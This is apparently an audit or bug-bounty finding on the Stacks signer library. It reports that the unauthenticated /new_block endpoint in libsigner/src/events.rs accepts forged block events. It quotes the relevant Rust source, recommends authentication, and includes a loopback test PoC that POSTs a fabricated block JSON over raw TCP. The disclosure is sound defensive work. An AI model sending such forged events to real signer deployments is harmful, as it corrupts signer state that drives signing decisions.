### Title
Unauthenticated forged `SignerEvent::NewBlock` injection via `/new_block` on the signer's event-receiver port - (File: libsigner/src/events.rs)

### Summary
`SignerEventReceiver::next_event` routes any POST to `/new_block` straight into `process_event::<T, StacksBlockEvent>` with no authentication, source check, or cryptographic verification of the JSON body, and directly converts it into `SignerEvent::NewBlock` fed to the runloop's out-channel. Because the receiver binds a plain `tiny_http` server (default `0.0.0.0:30000` per sample configs) and neither the receiver nor `process_event`/`StacksBlockEvent` check any secret, signature, or peer identity, any remote TCP client that can reach that port can forge `block_id`, `consensus_hash`, and `transactions` and have them delivered as if the co-located node actually processed that block.

### Finding Description
The equality the signer runloop relies on — "every `SignerEvent::NewBlock` consumed by the runloop corresponds to a block this node's event dispatcher actually processed" — is broken. `next_event` dispatches by URL only [1](#0-0) , and `process_event` reads the raw HTTP body, JSON-deserializes it into `E` (`StacksBlockEvent`), and converts it into a `SignerEvent` with no provenance check between the connecting client and the node's dispatcher identity [2](#0-1) . `StacksBlockEvent`'s fields (`index_block_hash`, `consensus_hash`, `block_hash`, `block_height`, `transactions`) are plain `serde`-deserialized from attacker-controlled JSON hex strings, with no cryptographic binding to any block header or chain state [3](#0-2) . The `TryFrom<StacksBlockEvent>` conversion copies these fields verbatim into `SignerEvent::NewBlock` [4](#0-3) .

Critically, the `auth_token`/`auth_password` mechanism documented in the sample configs (`sample/conf/mainnet-signer.toml`, `sample/conf/signer/mainnet-signer-conf.toml`) protects the *node's RPC* block-proposal endpoint, not the signer's inbound event-receiver HTTP server; neither `stacks-node/src/event_dispatcher.rs`/`worker.rs` (sending side) nor `libsigner/src/events.rs` (receiving side) reference `auth_token`/`Authorization` at all — a grep across both found zero matches. `SignerEventReceiver::bind` simply starts a `tiny_http::HttpServer` on the configured socket with no allowlist, TLS client-cert check, or shared-secret validation [5](#0-4) . The docs and sample configs even show this endpoint defaulting to `0.0.0.0:30000`, i.e., bound on all interfaces and remotely reachable, per `sample/conf/signer/mainnet-signer-conf.toml` line 39 (`endpoint = "0.0.0.0:30000"`).

Once accepted, `forward_event` unconditionally pushes the forged `SignerEvent::NewBlock` to every registered `Sender<SignerEvent<T>>`, i.e., straight into the signer runloop's state machine [6](#0-5) .

### Impact Explanation
A remote, unprivileged attacker with only network reachability to the signer's event-receiver port (no RPC secret, no peer key, no StackerDB slot) can inject arbitrary `SignerEvent::NewBlock` events into the signer's runloop, forging `block_id`, `consensus_hash`, `block_height`, and `transactions` with no relation to any block the co-located node validated or processed. This is repeatable per TCP connection/HTTP POST and requires no privileged role — matching the "unauthenticated/unauthorized write to state" Critical category, since it corrupts the signer's internal view of processed blocks (a piece of local signer state driving downstream signing decisions) via forged, unauthenticated data.

### Likelihood Explanation
Preconditions: the attacker must be able to reach the TCP port the signer's `SignerEventReceiver` is bound to. Per the shipped sample configs, this endpoint is commonly `0.0.0.0:30000`, i.e., not restricted to loopback by default in the documented configuration, making it remotely reachable in typical deployments that follow the sample configs verbatim. No secret, key, or slot ownership is required — a bare `TcpStream` and a well-formed HTTP POST with a JSON body matching `StacksBlockEvent`'s field names suffice. This is trivially repeatable (each POST is independent) and inexpensive.

### Recommendation
Require the receiver side of `SignerEventReceiver`/`process_event` to authenticate incoming requests (e.g., verify a shared secret/HMAC header sent by the node's `event_dispatcher`, or restrict `bind()` to loopback-only with an explicit opt-in for non-local binding plus mandatory shared-secret verification), and reject any `/new_block`, `/new_burn_block`, `/stackerdb_chunks`, or `/proposal_response` POST that lacks a valid authentication token before deserializing the body.

### Proof of Concept
```rust
// libsigner/src/events.rs (test module) - conceptual PoC
#[test]
fn forged_new_block_from_unauthenticated_client() {
    use std::io::Write;
    use std::net::TcpStream;
    use std::sync::mpsc::channel;

    let mut receiver: SignerEventReceiver<crate::v0::messages::SignerMessage> =
        SignerEventReceiver::new(false);
    let addr = receiver.bind("127.0.0.1:0".parse().unwrap()).unwrap();
    let (tx, rx) = channel();
    receiver.add_consumer(tx);

    std::thread::spawn(move || receiver.main_loop());

    // Attacker: bare TCP connection, no auth token, no peer identity.
    let mut stream = TcpStream::connect(addr).unwrap();
    let body = r#"{
        "index_block_hash": "0x1111111111111111111111111111111111111111111111111111111111111111",
        "consensus_hash": "0x2222222222222222222222222222222222222222",
        "block_hash": "0x3333333333333333333333333333333333333333333333333333333333333333",
        "block_height": 999999,
        "transactions": []
    }"#;
    let req = format!(
        "POST /new_block HTTP/1.1\r\nHost: x\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        body.len(), body
    );
    stream.write_all(req.as_bytes()).unwrap();

    // Assert the forged event reaches the runloop's channel unmodified/unauthenticated.
    let ev = rx.recv_timeout(std::time::Duration::from_secs(5)).unwrap();
    match ev {
        SignerEvent::NewBlock { block_height, .. } => assert_eq!(block_height, 999999),
        _ => panic!("expected forged NewBlock event"),
    }
}
```
This demonstrates `process_event::<T, StacksBlockEvent>` (libsigner/src/events.rs:519-542) accepting and forwarding an attacker-supplied, unauthenticated body as a genuine `SignerEvent::NewBlock`.

### Citations

**File:** libsigner/src/events.rs (L404-408)
```rust
    fn bind(&mut self, listener: SocketAddr) -> Result<SocketAddr, EventError> {
        self.http_server = Some(HttpServer::http(listener).expect("failed to start HttpServer"));
        self.local_addr = Some(listener);
        Ok(listener)
    }
```

**File:** libsigner/src/events.rs (L446-447)
```rust
            } else if request.url() == "/new_block" {
                process_event::<T, StacksBlockEvent>(request)
```

**File:** libsigner/src/events.rs (L469-490)
```rust
    fn forward_event(&mut self, ev: SignerEvent<T>) -> bool {
        if self.out_channels.is_empty() {
            // nothing to do
            error!("No channels connected to event receiver");
            false
        } else if self.out_channels.len() == 1 {
            // avoid a clone
            if let Err(e) = self.out_channels[0].send(ev) {
                error!("Failed to send to signer runloop: {:?}", &e);
                return false;
            }
            true
        } else {
            for (i, out_channel) in self.out_channels.iter().enumerate() {
                if let Err(e) = out_channel.send(ev.clone()) {
                    error!("Failed to send to signer runloop #{}: {:?}", i, &e);
                    return false;
                }
            }
            true
        }
    }
```

**File:** libsigner/src/events.rs (L519-542)
```rust
fn process_event<T, E>(mut request: HttpRequest) -> Result<SignerEvent<T>, EventError>
where
    T: SignerEventTrait,
    E: serde::de::DeserializeOwned + TryInto<SignerEvent<T>, Error = EventError>,
{
    let mut body = String::new();

    if let Err(e) = request.as_reader().read_to_string(&mut body) {
        error!("Failed to read body: {:?}", &e);
        ack_dispatcher(request);
        return Err(EventError::MalformedRequest(format!(
            "Failed to read body: {:?}",
            e
        )));
    }
    // Regardless of whether we successfully deserialize, we should ack the dispatcher so they don't keep resending it
    ack_dispatcher(request);
    let json_event: E = serde_json::from_slice(body.as_bytes())
        .map_err(|e| EventError::Deserialize(format!("Could not decode body to JSON: {:?}", e)))?;

    let signer_event: SignerEvent<T> = json_event.try_into()?;

    Ok(signer_event)
}
```

**File:** libsigner/src/events.rs (L690-706)
```rust
#[derive(Debug, Deserialize)]
/// Payload received from the event dispatcher for a new Stacks block
pub struct StacksBlockEvent {
    #[serde(with = "prefix_hex")]
    index_block_hash: StacksBlockId,
    #[serde(with = "prefix_opt_hex")]
    #[serde(default)]
    signer_signature_hash: Option<Sha512Trunc256Sum>,
    #[serde(with = "prefix_hex")]
    consensus_hash: ConsensusHash,
    #[serde(with = "prefix_hex")]
    block_hash: BlockHeaderHash,
    block_height: u64,
    /// The transactions included in the block
    #[serde(deserialize_with = "deserialize_raw_tx_hex")]
    pub transactions: Vec<StacksTransaction>,
}
```

**File:** libsigner/src/events.rs (L708-720)
```rust
impl<T: SignerEventTrait> TryFrom<StacksBlockEvent> for SignerEvent<T> {
    type Error = EventError;

    fn try_from(block_event: StacksBlockEvent) -> Result<Self, Self::Error> {
        Ok(SignerEvent::NewBlock {
            signer_sighash: block_event.signer_signature_hash,
            block_id: block_event.index_block_hash,
            consensus_hash: block_event.consensus_hash,
            block_height: block_event.block_height,
            transactions: block_event.transactions,
        })
    }
}
```
